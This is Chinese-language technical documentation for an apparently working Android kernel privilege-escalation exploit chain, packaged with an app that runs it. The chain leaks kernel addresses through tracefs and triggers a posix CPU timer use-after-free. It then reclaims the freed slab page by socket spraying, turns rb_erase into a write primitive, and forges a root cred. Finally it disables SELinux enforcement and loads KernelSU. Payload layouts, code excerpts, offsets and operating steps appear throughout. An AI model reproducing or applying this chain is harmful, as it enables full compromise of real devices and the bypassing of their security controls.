# 提权流程（EK-CORE · uid0 链路）

这份文档只讲一件事：**从 shell 上下文走到 `uid=0` 的每一步在做什么、依赖什么、失败会怎样。**
代码行号对应 `payload/src/ek-core-uid0.c`。

---

## 0. 全流程一览

```
[前提] shell(uid 2000) + tracefs 可读写 + 内核在支持列表里
   │
   ├─ S1 开 trace：关 tracing_on → 清 buffer → 开 kmem 事件 → 打开 per_cpu trace_pipe_raw
   ├─ S2 解 direct map 基址：mm_page_alloc(order=1) 的 pfn 集合 ↔ k_itimer 虚拟地址集合
   ├─ S3 泄漏：子进程造 4096 个 CLOCK_THREAD_CPUTIME_ID 定时器 → exec → 读 raw trace
   │        得到 victim k_itimer 地址 V、do_timer_create 的 call site → KASLR slide
   │        同时拿到子进程的真实 struct cred 地址 R
   ├─ S4 回收：把 V 所在的 order-1 slab 页用自己的 socket 缓冲区占回来（payload 铺在页上）
   ├─ S5 写原语：reap 僵尸 → cleanup_timerqueue() → rb_erase() case1-left → *(u64*)S = 0
   ├─ S6 落 cred：S = R+8（清 uid/gid）或 S = task->cred（换成 fake cred 页）
   ├─ S7 放行：写 go 管道 → 子进程 setresuid(0,0,0) → 起 shell / 交给 ksud
   └─ S8 KernelSU：selinux_state.enforcing=0、panic_on_warn=0 → ksud late-load → su 可用
```

**唯一不可逆的一点**：S4 之后那块页要么被我们控制，要么被系统收走。前者能继续，后者必须
`park`（按住僵尸、什么都不写），因为一次不受控的 `rb_erase` 会直接把内核打挂。

## 1. 前提检查（S0）

| 条件 | 为什么 | 代码 |
| --- | --- | --- |
| 进程 uid=2000 / `u:r:shell:s0` | payload 要 `execve` 自己、要读 tracefs | 由 Shizuku 的 UserService 提供 |
| `/sys/kernel/tracing/trace` 可写 | 开关 tracing、清 buffer | `wr()` @134 |
| `per_cpu/cpuN/trace_pipe_raw` 可读 | **文本 `/trace` 的指针是哈希过的，只有 raw 记录带真值** | `ensure_raw()` @238 |
| `events/kmem/rss_stat/trigger` 可写 | 用 `enable_event:kmem:<name>` 动态开事件，不需要改 event id | `enable_events()` @171 |

App 侧对应 `check_uid0` 模式，成功标记 `READY`。

## 2. S1 开 trace（@171–288）

```c
wr("/sys/kernel/tracing/tracing_on", "0");
wr("/sys/kernel/tracing/trace", "");          // 清环
for (cpu) drain_cpu(cpu);                     // 每个 CPU 的 raw 都读空
wr("/sys/kernel/tracing/buffer_size_kb", "8192");
enable_events();                              // 5 个 kmem 事件
ensure_raw();                                 // 建 8 个 raw fd（NONBLOCK）
wr("/sys/kernel/tracing/tracing_on", "1");
```

要点：**每个 CPU 都要清**。只清 cpu0 会让别的核上的陈年记录混进 harvest，后面按
`call_site`/`bytes_req` 过滤时会多出一堆假阳性。

---

## 3. S2 解 direct map 基址（`calibrate_base()` @411）

`direct map base` 用来把 `k_itimer` 的虚拟地址换算成 PFN：`pfn = (V - base) >> 12`。
不测出来就没法判断"这一页到底是不是我的"。

做法是**交叉投票**：

1. 同一时间窗里收两份记录：`kmem_cache_alloc(bytes_req=0x108)` 拿 k_itimer 虚拟地址；
   `mm_page_alloc(order=1)` 拿 pfn 集合
2. 扫描候选基址（`PAGE_OFFSET` 附近的窗口），
3. 对每个候选算出 pfn 集合，和真实 order-1 分配集合求交集 —— 命中率最高的那个就是基址

日志：`[base] recs=… order1_pages=… timer_allocs=…` → `[base] candidates=… best=… votes=…`
→ `[+] direct map base=…`。失败会打印 `[-] base calibration failed` 并退出。

---

## 4. S3 泄漏 V / R / slide（`leak_cred()`，主体在 @599–@700）

### 4.1 造定时器

```
NTIMERS=4096 个 CLOCK_THREAD_CPUTIME_ID 定时器，其中 victim 带 SIGEV_SIGNAL
```

为什么是这个量：`posix_timers_cache` 是 order-1（31 对象/页）。4096 个对象足够把
"半满 slab" 填满，让 victim 落在一张**我们能整张掏空**的页上（S4 的前提）。

### 4.2 exec 触发 UAF

子进程 `execve("/proc/self/exe")` → 旧 `signal_struct` 释放 →
`posix_cpu_timers_exit()` → `posix_cpu_timer_del()` 在已摘链的节点上继续操作 →
`k_itimer` 被 `kfree` 回 `posix_timers_cache`。

### 4.3 从 raw trace 里把地址捞出来

`kmem_cache_free` 记录里有 `ptr`（就是 V）和 `call_site`；`kmem_cache_alloc` 里能看到
`do_timer_create` 的 call site 低 21 位。

```
slide = 实测 call_site − STATIC_TIMER_SITE
```

`STATIC_TIMER_SITE` 是链接期地址（`device_config.h` 里由 kallsyms 算出来），
`TIMER_SITE_LOW21` 只用来在记录里认领这条 call site。

日志：`[cred]   match#… ptr=… site_low=…` → `[cred] attempt=… R=… task=…`。

---

## 5. S4 回收（`run_plant()` @~980–1230、`spray_thread()` @924）

三件事同时做：

1. **整形**：`create_slab_padding()` 先造 `PADDING_TIMERS = 150 × 31` 个定时器把 cache 的
   partial slab 填满，让 victim 所在页在清空后**真的还给 buddy**
2. **占页**：`SPRAY_THREADS=8` 个线程 × `SPRAY_SOCKS=2048` 个 `AF_UNIX` socket，
   `SO_SNDBUF` 放大到 16 MiB，把 8 KiB 报文（= payload）灌进去
3. **判定**：读 `mm_page_alloc` 记录，看这张页是不是**我们自己的 spray 线程**拿走的
   （`tid_is_spray_tid()` @914）——不是就放弃重试，绝不硬 reap

payload 页布局（`build_payload()` @841 / `build_fake_cred()` @853）：

```
offset 0x00  rb_node.__rb_parent_color   = 0（MODE_ZERO）或 A（自引用）
offset 0x08  rb_node.rb_right            = 0        ← 保证走 case1-left
offset 0x10  rb_node.rb_left             = S        ← 写入目标
```

日志序列：`[+] plant%d slab padding=…` → `[+] plant%d target=…` →
`[+] plant%d V=… slab_pfn=… slab_own=…/31 slide=…` →
`[+] plant%d padding dropped, releasing the burst` → `[+] plant%d burst hit=…` →
`[+] plant%d reaped status=…`。

**注意 `slab_own=x/31`**：这是"这张页上有几个对象已经归我们"的证据，x 越大越稳。
`[-] plant%d burst missed (free_seen=…)` 是可重试的中止；`holding zombie` 则不可重试。

## 6. S5 写原语（`stage_write()` @763）

reap 僵尸后内核走 `cleanup_timerqueue()` → `timerqueue_del()` → `rb_erase()`：
case-1-left 会执行 `rb_left->__rb_parent_color = 0`，于是 **`*(u64*)S = 0` 精确一次**。

两种形态：

| 模式 | 页内容 | 效果 |
| --- | --- | --- |
| `MODE_ZERO` | `__rb_parent_color = 0` | `[S] = 0`，最干净 |
| `MODE_PTR` | `= A`（节点自身地址） | `RB_EMPTY_NODE()` 为真，`__rb_parent()` 不越出本页，但会触发一次 WARN |

`stage_write()` 每一轮都带超时和验证，失败就 `park_forever()`（@788）：

```c
logf("[!] %s -- parking without reap (zombie held)", why);
logf("[!] reboot the device to clean up; do not kill this process");
```

## 7. S6 落 cred（两条路）

### 7.1 零写路线（`fake` 之前的默认链路）

`S = R + CRED_UID_OFF(0x8)` → 子进程的 `uid/gid` 被清零，但 cred 本身仍是真 cred，
SELinux blob 合法。然后 `setresuid(0,0,0)` + `execve("/system/bin/sh")`。

### 7.2 fake cred 路线（`fake` 模式，YuKongA 链路）

1. `write_ksu_script()` @709 先把 ksud 安装脚本落到 `/data/local/tmp`
2. `S = g_child_task + OFF_TASK_CRED` → `task->cred` 指向我们用 spray 页冒充的 cred
3. 页上按 BTF 布局铺字段：`cap_* = FULLCAP`、`euid=fsuid=0`、
   `security` 指向页内 LSM blob（`sid=1` kernel）、`user/user_ns/ucounts/group_info`
   指向内核现成的 `root_user/init_user_ns/init_ucounts/init_groups`（都要 + slide）
4. `selinux_state.enforcing = 0`（insmod 的前提）
5. `panic_on_warn = 0`（自引用节点 erase 会 WARN，不能让它 panic）
6. 最后一次零写把 `rb_erase` 弄脏的 `uid/gid` 补回 0

日志：`[+] fake cred A=… selinux_state=…` → `[verify] /proc/<pid>/status` 里 `Uid:` / `CapEff:`。

---

## 8. S7 放行与交接（`wait_child_main()` @1243）

主进程写 `go` 管道 → 子进程醒来：

```c
[child] woke uid=… euid=… pid=… tgid=…
[child] setresuid(0,0,0)=0 errno=0 resuid=0/0/0
```

然后按模式分叉：

- `shell`：子进程 exec `/system/bin/sh`
- `daemon`：起临时 su daemon（App 不暴露该模式：它依赖一个已从包里移除的 su 二进制）
- `fake`：`fork` 一个 worker 去 `exec ksu_stage.sh`（`[fake] forking ksud worker`），
  主进程继续驻留

## 9. S8 KernelSU（`write_ksu_script()` 生成的脚本）

脚本做三件事，全部用 shell 权限完成：

```sh
# 1. 找到已安装 KernelSU 管理器的 libksud.so
KSUD="$(pm path me.weishu.kernelsu | sed 's/package://;s/base.apk/lib\/arm64\/libksud.so/')"
# 2. 按本机 KMI late-load
"$KSUD" late-load --kmi android15-6.6 --allow-shell
# 3. 校验
grep kernelsu /proc/modules
```

成功标志：`[ksu] ksud=… version=…` → `[ksu] late-load rc=0` → `/proc/modules` 出现 `kernelsu`
→ `su -c id` 返回 `uid=0(root) ... context=u:r:ksu:s0`。

## 10. 失败语义（最重要的一节）

| 现象 | 含义 | 能做/不能做 |
| --- | --- | --- |
| `[-] base calibration failed` | tracefs 数据不够，环境不成立 | 可以重跑；检查 buffer/CPU |
| `[-] cred leak failed` | 没抓到 victim 记录 | 可以重跑 |
| `[-] plant%d burst missed` | 页被别人抢走 | 可以重试（代码自己重试 3 轮） |
| `[+] plant%d V=… slab_own=3/31` | 页只占了一部分 | 风险升高，代码会继续判定 |
| `[!] … parking without reap (zombie held)` | **已放弃写入，按住僵尸** | 不能 kill；只能重启 |
| `[-] plant%d exhausted retries` | 重试用尽 | 同上 |
| `Kernel panic / oops` | 已经有不受控操作 | 设备会重启；看落盘日志 |
| `[ksu] late-load rc≠0` | root 有了但模块没装上 | SELinux/KMI 不匹配，检查 `--kmi` |

**为什么不能 kill**：成功写 cred 之后，那块 slab 页承载着活着的 `task->cred`。
进程一退出就把页还给 slab，下一次 `cleanup_timerqueue()` 会在陈旧 `rb_node` 上操作并 panic。
上游的 `park_forever()` 就是 `for(;;) pause()` —— 这是设计，不是卡住。

## 11. App 侧怎么驱动这条流程

`ExtractEngine` 只做四件事，且每件都有明确的失败出口：

1. **部署**：assets → `/data/local/tmp/extract-kit/`，sha256 校验（不符就不跑）
2. **预检**：`check_uid0`（`READY`）或 `--preflight`（`PREFLIGHT_PASS`），不过就警告
3. **主链**：流式执行，**日志逐行映射成 10 个阶段**（`StageMap`），
   命中成功标记或进入 `parked` 就停
4. **校验**：`id` / `su -c id` / `grep kernelsu /proc/modules` / `getenforce`

`StageMap` 识别的阶段：

```
[1/10] 环境前提   [2/10] 开 tracefs   [3/10] direct map   [4/10] 泄漏
[5/10] slab 回收  [6/10] 写原语       [7/10] fake cred    [8/10] KernelSU
[9/10] 交接 root  [10/10] 完成
```

并且会把两类"危险但正常"的状态单独标出来：

- `parking / exhausted retries / holding zombie` → 界面显示"已驻留，勿 kill，重启才清理"
- `panic / oops / general protection fault` → 提示设备可能马上重启

## 12. 时间预算（dada 实测量级）

| 阶段 | 典型耗时 | 说明 |
| --- | --- | --- |
| trace 开启 + 清环 | < 1 s | 8 核 |
| direct map 标定 | 2–10 s | 取决于 buffer 与 CPU 数 |
| 泄漏 | 3–15 s | 4096 定时器 + exec + 收集 |
| 一次 plant | 5–20 s | 含 spray burst 与判定 |
| fake + ksud | 2–10 s | 取决于管理器 APK 解包 |
| **合计** | **20–60 s** | 失败重试会线性叠加 |

App 里 `extract_uid0` 的默认超时是 420 s，够 3 轮重试 + ksud。
